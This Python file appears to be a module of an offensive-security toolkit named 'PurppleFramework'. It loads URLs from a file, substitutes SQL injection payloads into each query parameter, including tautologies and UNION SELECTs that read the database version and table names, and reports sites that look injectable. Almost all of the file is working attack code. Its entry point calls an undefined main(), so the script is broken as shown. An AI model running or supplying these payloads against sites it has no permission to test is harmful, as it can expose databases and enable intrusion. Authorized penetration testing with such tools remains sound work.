import requests
import urllib.parse
import os


def get_urls_file_path():
    """Returns the correct path to urls.txt in PurppleFramework/txts."""
    return os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)),"..", "..", "..", "txts", "urls.txt"))

def load_urls():
    """Loads URLs from PurppleFramework/txts/urls.txt."""
    file_path = get_urls_file_path()
    try:
        with open(file_path, "r") as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"[!] File not found: {file_path}")
        return []

def test_sqli(url):
    """Tests a URL for SQL Injection vulnerabilities using common payloads."""
    sqli_payloads = [
        "' OR '1'='1", 
        "\" OR \"1\"=\"1", 
        "' OR 1=1 --", 
        "\" OR 1=1 --", 
        "' UNION SELECT null, version() --",
        "' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() -- ",
        "' UNION SELECT 1,2,3,4 -- "

    ]
    
    for payload in sqli_payloads:
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        if not query_params:
            continue
        
        for param in query_params:
            test_params = query_params.copy()
            test_params[param] = payload
            test_query = urllib.parse.urlencode(test_params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{test_query}"
            
            try:
                response = requests.get(test_url, timeout=5)
                if "error" in response.text.lower() or "sql" in response.text.lower():
                    print(f"[+] Possible (Test with sqlmap) SQL Injection On: {test_url}")
                    return True
            except requests.RequestException:
                print(f"[!] Failed to request: {test_url}")
    return False

def scan_sqli():
    urls = load_urls()
    if not urls:
        print("[!] No URLs loaded from PurppleFramework/txts/urls.txt.")
        return
    
    print("[+] Testing for SQL Injection vulnerabilities...")
    sqli_found = False
    
    for url in urls:
        if test_sqli(url):
            sqli_found = True
    
    if not sqli_found:
        print("[-] No SQL Injection vulnerabilities found on any URL.")

if __name__ == "__main__":
    main()
